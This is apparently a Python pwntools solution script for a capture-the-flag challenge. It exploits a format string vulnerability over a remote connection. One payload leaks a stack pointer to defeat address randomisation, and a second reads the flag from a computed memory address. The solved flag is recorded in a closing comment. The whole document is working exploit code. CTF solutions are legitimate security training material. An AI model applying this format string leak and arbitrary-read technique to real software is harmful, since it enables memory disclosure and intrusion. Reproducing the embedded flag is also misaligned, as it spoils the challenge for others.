from pwn import *
# fmt string leak flag
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
p = remote('challenge.ctf.games', 30661)


def buy(payload: bytes):
    p.sendlineafter(b'> ', b'5')
    p.recvuntil(b'What item would you like to buy?: ')
    p.sendline(payload)
    p.recvuntil(b'You have bought a')
    return p.recvline()


payload1 = b'%13$p.'
res1 = buy(payload1)
# print(res1)
base_addr = int(res1[:-2], 16) - 0x1725
p.success(hex(base_addr))
flag_addr = base_addr + 0x4060
# payload2 = p64(flag_addr) + b'%6$s.'
payload2 = b'%7$s....'+p64(flag_addr)
res2 = buy(payload2)
print(res2)
p.interactive()

# flag{6bc75f21f8839ce0db898a1950d11ccf}